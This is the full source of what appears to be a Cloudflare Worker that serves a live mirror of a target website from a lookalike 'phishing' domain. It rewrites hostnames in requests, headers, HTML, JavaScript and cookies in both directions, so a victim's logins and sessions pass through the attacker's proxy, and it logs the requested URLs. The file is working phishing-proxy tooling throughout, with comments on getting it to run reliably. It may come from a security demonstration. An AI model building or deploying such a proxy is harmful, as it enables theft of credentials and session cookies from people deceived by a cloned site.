export default {
	async fetch(request, env, ctx) {
		const url = new URL(request.url);
		const hostname = url.hostname;
		let myrootDomain = hostname;
		let subdomain = ""
		let requestBody = request.method !== 'GET' ? await request.text() : null;

		// get subdomain if present
		//
		// On a custom phishing domain (e.g. landing.misconfigured.email) the
		// "root domain" is the last two labels and the subdomain is the first
		// one. On the default workers.dev host (e.g.
		// mirror-nikos.c0c0n.workers.dev) the label layout is different, so the
		// whole host is treated as the "phishing root" and requests are
		// proxied straight to the target root, keeping the original path.
		const isWorkersDev = hostname.endsWith(".workers.dev");

		if (!isWorkersDev && hostname.split('.').length > 2) {
			myrootDomain = hostname.split('.').slice(-2).join('.');
			subdomain = hostname.split('.')[0];
		}

		// replace in the request body hostname with targetDomain
		if (requestBody) {
			requestBody = requestBody.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN);
		}
	

		const modifiedRequestInit = {
			body: requestBody,
			headers: new Headers(request.headers),
			method: request.method,
			// Follow the target's own redirects (e.g. google.com -> www.google.com)
			// server-side and return the final response. Using 'manual' would make
			// the worker echo a Location that points back to its own URL, which
			// creates an infinite redirect loop on the workers.dev host.
			redirect: 'follow'
		};

		for (const [key, value] of modifiedRequestInit.headers) {
			modifiedRequestInit.headers.set(key, value.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));
		}

		modifiedRequestInit.headers.set('Host', hostname.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));

		if(modifiedRequestInit.headers.has("referer")){
			modifiedRequestInit.headers.set("referer", modifiedRequestInit.headers.get("referer").replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));
		}

		if(modifiedRequestInit.headers.has("origin")){
			modifiedRequestInit.headers.set("origin", modifiedRequestInit.headers.get("origin").replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));
		}

		// Ask the target for encodings the Workers runtime transparently
		// decodes. Without this the response body may be returned compressed
		// (e.g. gzip) while still carrying the Content-Encoding header, and
		// response.text() would hand back undecodable binary data.
		modifiedRequestInit.headers.set("accept-encoding", "gzip, deflate");

		const targetURL = env.HTTP_SCHEME + hostname.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN) + url.pathname + url.search.replace(myrootDomain, env.TARGET_DOMAIN);

		console.log('targetURL', targetURL);

		// Rewrite a value that belongs to the target domain back to this
		// "phishing" domain. In workers.dev mode the "www." prefix is also
		// stripped, because the www. subdomain does not resolve on workers.dev.
		const rewriteToRootDomain = (value) => {
			let out = value.replace(new RegExp(env.TARGET_DOMAIN, 'g'), myrootDomain);
			if (isWorkersDev) {
				out = out.replace(new RegExp('www\\.' + myrootDomain, 'g'), myrootDomain);
			}
			return out;
		};

		const modifiedRequest = new Request(targetURL, modifiedRequestInit);
		const response = await fetch(modifiedRequest);
		const content_type = response.headers.get("Content-Type");

		if (!content_type || content_type.includes("text/html") || content_type.includes("javascript")) {
			var html = await response.text()
			var statusCode = response.status;
			html = rewriteToRootDomain(html);

			let headers = new Headers(response.headers);

			for (const [key, value] of headers) {
				headers.set(key, rewriteToRootDomain(value));
			}

			// The body has already been decoded with response.text(), so it is
			// no longer compressed. Drop Content-Encoding (and the stale
			// Content-Length), otherwise the browser tries to gunzip plain
			// HTML and renders binary garbage.
			headers.delete('Content-Encoding');
			headers.delete('Content-Length');

			return new Response(html, {
				headers: headers,
				status: statusCode
			})
		} 
		return response
	}
};